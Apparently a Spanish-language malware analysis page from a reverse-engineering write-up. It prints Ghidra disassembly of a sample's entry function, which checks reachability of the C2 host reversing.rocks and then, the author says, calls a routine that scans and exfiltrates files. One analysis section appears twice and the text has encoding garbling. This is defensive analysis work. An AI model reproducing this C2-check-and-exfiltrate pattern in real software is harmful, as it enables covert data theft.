```

                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined __stdcall FUN_004011a0(void)
                               assume FS_OFFSET = 0xffdff000
             undefined         <UNASSIGNED>   <RETURN>
                             FUN_004011a0                                    XREF[1]:     ___tmainCRTStartup:004013c5(c)
        004011a0 6a 00           PUSH       0x0
        004011a2 6a 01           PUSH       0x1
        004011a4 68 2c 21        PUSH       s_http://reversing.rocks/_0040212c               = "http://reversing.rocks/"
                 40 00
        004011a9 ff 15 ac        CALL       dword ptr [->WININET.DLL::InternetCheckConnect   = 0000239e
                 20 40 00
        004011af 85 c0           TEST       EAX,EAX
        004011b1 74 0d           JZ         LAB_004011c0
        004011b3 e8 78 ff        CALL       FUN_00401130                                     undefined4 FUN_00401130(void)
                 ff ff
        004011b8 6a 00           PUSH       0x0
        004011ba ff 15 34        CALL       dword ptr [->MSVCR120.DLL::exit]                 = 000023fe
                 20 40 00
                             -- Flow Override: CALL_RETURN (COMPUTED_CALL_TERMINATOR)
                             LAB_004011c0                                    XREF[1]:     004011b1(j)
        004011c0 6a 01           PUSH       0x1
        004011c2 ff 15 34        CALL       dword ptr [->MSVCR120.DLL::exit]                 = 000023fe
                 20 40 00
                             -- Flow Override: CALL_RETURN (COMPUTED_CALL_TERMINATOR)
             assume FS_OFFSET = <UNKNOWN>
        004011c8 cc              ??         CCh
             assume FS_OFFSET = 0xffdff000
                             LAB_004011c9                                    XREF[1]:     004020d4(*)
        004011c9 b8 4d 5a        MOV        EAX,0x5a4d
                 00 00
        004011ce 66 39 05        CMP        word ptr [IMAGE_DOS_HEADER_00400000],AX
                 00 00 40 00
        004011d5 74 04           JZ         LAB_004011db
                             LAB_004011d7                                    XREF[2]:     004011eb(j), 004011f9(j)
        004011d7 33 c0           XOR        EAX,EAX
        004011d9 eb 34           JMP        LAB_0040120f
                             LAB_004011db                                    XREF[1]:     004011d5(j)
        004011db 8b 0d 3c        MOV        ECX,dword ptr [IMAGE_DOS_HEADER_00400000.e_lfa
                 00 40 00
        004011e1 81 b9 00        CMP        dword ptr [ECX + 0x400000]=>IMAGE_NT_HEADERS32
                 00 40 00
                 50 45 00 00
        004011eb 75 ea           JNZ        LAB_004011d7
        004011ed b8 0b 01        MOV        EAX,0x10b
                 00 00
        004011f2 66 39 81        CMP        word ptr [ECX + 0x400018]=>IMAGE_NT_HEADERS32_
                 18 00 40 00
        004011f9 75 dc           JNZ        LAB_004011d7
        004011fb 33 c0           XOR        EAX,EAX
        004011fd 83 b9 74        CMP        dword ptr [ECX + 0x400074]=>IMAGE_NT_HEADERS32
                 00 40 00 0e
        00401204 76 09           JBE        LAB_0040120f
        00401206 39 81 e8        CMP        dword ptr [ECX + 0x4000e8]=>IMAGE_NT_HEADERS32
                 00 40 00
        0040120c 0f 95 c0        SETNZ      AL
                             LAB_0040120f                                    XREF[2]:     004011d9(j), 00401204(j)
        0040120f 6a 01           PUSH       0x1
        00401211 a3 30 30        MOV        [DAT_00403030],EAX
                 40 00
        00401216 ff 15 44        CALL       dword ptr [->MSVCR120.DLL::__set_app_type]       = 00002440
                 20 40 00
        0040121c 59              POP        ECX
        0040121d 6a ff           PUSH       -0x1
        0040121f ff 15 24        CALL       dword ptr [->KERNEL32.DLL::EncodePointer]        = 000025be
                 20 40 00
        00401225 8b 0d 64        MOV        ECX,dword ptr [->MSVCR120.DLL::_fmode]           = 000024b4
                 20 40 00
        0040122b a3 80 33        MOV        [DAT_00403380],EAX
                 40 00
        00401230 a3 84 33        MOV        [DAT_00403384],EAX
                 40 00
        00401235 a1 54 30        MOV        EAX,[DAT_00403054]
                 40 00
        0040123a 89 01           MOV        dword ptr [ECX],EAX
        0040123c 8b 0d 68        MOV        ECX,dword ptr [->MSVCR120.DLL::_commode]         = 000024be
                 20 40 00
        00401242 a1 48 30        MOV        EAX,[DAT_00403048]
                 40 00
        00401247 89 01           MOV        dword ptr [ECX],EAX
        00401249 e8 29 05        CALL       FUN_00401777                                     undefined FUN_00401777(void)
                 00 00
        0040124e e8 45 02        CALL       FUN_00401498                                     undefined4 FUN_00401498(void)
                 00 00
        00401253 83 3d 00        CMP        dword ptr [DAT_00403000],0x0                     = 00000001h
                 30 40 00 00
        0040125a 75 0c           JNZ        LAB_00401268
        0040125c 68 98 14        PUSH       FUN_00401498
                 40 00
        00401261 ff 15 54        CALL       dword ptr [->MSVCR120.DLL::__setusermatherr]     = 0000247a
                 20 40 00
        00401267 59              POP        ECX
                             LAB_00401268                                    XREF[1]:     0040125a(j)
        00401268 e8 4a 05        CALL       FUN_004017b7                                     undefined FUN_004017b7(void)
                 00 00
        0040126d 83 3d 10        CMP        dword ptr [DAT_00403010],-0x1                    = FFFFFFFEh
                 30 40 00 ff
        00401274 75 09           JNZ        LAB_0040127f
        00401276 6a ff           PUSH       -0x1
        00401278 ff 15 50        CALL       dword ptr [->MSVCR120.DLL::_configthreadlocale]  = 00002464
                 20 40 00
        0040127e 59              POP        ECX
                             LAB_0040127f                                    XREF[1]:     00401274(j)
        0040127f 33 c0           XOR        EAX,EAX
        00401281 c3              RET
        00401282 68              ??         68h    h
        00401283 97              ??         97h                                              ?  ->  00401797
        00401284 17              ??         17h
        00401285 40              ??         40h    @
        00401286 00              ??         00h
        00401287 e8              ??         E8h
        00401288 d6              ??         D6h
        00401289 04              ??         04h
        0040128a 00              ??         00h
        0040128b 00              ??         00h
        0040128c a1              ??         A1h
        0040128d 50              ??         50h    P                                         ?  ->  00403050

```

La funci√≥n FUN_004011a0 es el punto de entrada principal del malware, referenciada desde ___tmainCRTStartup. Su funci√≥n es comprobar la conectividad a internet y ejecutar la l√≥gica maliciosa principal si la conexi√≥n con el C2 (Command & Control) est√° activa.


### üß† RESUMEN DEL COMPORTAMIENTO
1Ô∏è‚É£	Comprueba si hay conexi√≥n con http://reversing.rocks/ usando InternetCheckConnectionA.  
2Ô∏è‚É£	Si hay conexi√≥n, llama a FUN_00401130 (que inicializa WinINet y lanza la exfiltraci√≥n de datos).  
3Ô∏è‚É£	Si no hay conexi√≥n, termina el proceso con exit(1).  

## üîç AN√ÅLISIS DETALLADO
###üîπ 1. Comprobaci√≥n de conexi√≥n a Internet
```
004011a4 PUSH s_http://reversing.rocks
004011a9 CALL [InternetCheckConnectionA]
004011af TEST EAX,EAX
004011b1 JZ LAB_004011c0
```
- Usa InternetCheckConnectionA para comprobar si el dominio C2 (reversing.rocks) es accesible.
- Si no hay conexi√≥n (EAX = 0), salta a exit(1).

### üîπ 2. Ejecuci√≥n del payload si hay conexi√≥n
```
004011b3 CALL FUN_00401130
```
Ya analizamos, esta funci√≥n [FUN_00401130](FUN_00401130.md):  
- Llama a InternetOpenA, InternetConnectA  
- Inicia comunicaci√≥n con el servidor remoto  
- Llama a FUN_00401000 ‚Üí escaneo y exfiltraci√≥n de archivos [FUN_00401000](FUN_00401000.md)  

###üîπ 3. Finalizaci√≥n del proceso
```
004011ba CALL [exit]
```
- Llama a exit(0) si tuvo √©xito
- O a exit(1) si fall√≥
    
## üîç AN√ÅLISIS DETALLADO
###üîπ 1. Comprobaci√≥n de conexi√≥n a Internet
```
004011a4 PUSH s_http://reversing.rocks
004011a9 CALL [InternetCheckConnectionA]
004011af TEST EAX,EAX
004011b1 JZ LAB_004011c0
```
- Usa InternetCheckConnectionA para comprobar si el dominio C2 (reversing.rocks) es accesible.
- Si no hay conexi√≥n (EAX = 0), salta a exit(1).

###üîπ 2. Ejecuci√≥n del payload si hay conexi√≥n
```
004011b3 CALL FUN_00401130
```
- Llama a InternetOpenA, InternetConnectA
- Inicia comunicaci√≥n con el servidor remoto
- Llama a FUN_00401000 ‚Üí escaneo y exfiltraci√≥n de archivos [FUN_00401000](FUN_00401000.md) 

###üîπ 3. Finalizaci√≥n del proceso
```
004011ba CALL [exit]
```
- Llama a exit(0) si tuvo √©xito
- O a exit(1) si fall√≥
